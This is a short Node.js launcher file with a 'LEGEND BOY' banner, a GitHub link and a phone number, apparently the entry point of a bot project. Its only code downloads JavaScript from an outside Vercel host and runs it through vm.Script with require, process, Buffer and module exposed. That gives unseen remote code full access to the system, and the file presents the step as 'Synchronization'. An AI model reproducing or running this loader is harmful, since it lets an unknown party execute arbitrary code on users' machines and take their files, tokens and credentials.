/*     
LEGEND BOY HACKER IS HERE
─────────────────────────────────────────────────────────────
📛 Project   : LEGEND BOY 
👤 Creator   : LEGEND BOY 
🌐 GitHub    : https://github.com/saqlainali1122
📱 Contact   : 03244180461

─────────────────────────────────────────────────────────────

//   ⭐ PROUDLY MADE IN PAKISTAN ⭐
*/



const axios = require('axios');
const vm = require('vm');
const config = require('./config.js');

(async () => {
  try {
    console.log("👑 legend boy  Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`https://cdn-bandaheali.vercel.app/file/index.js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
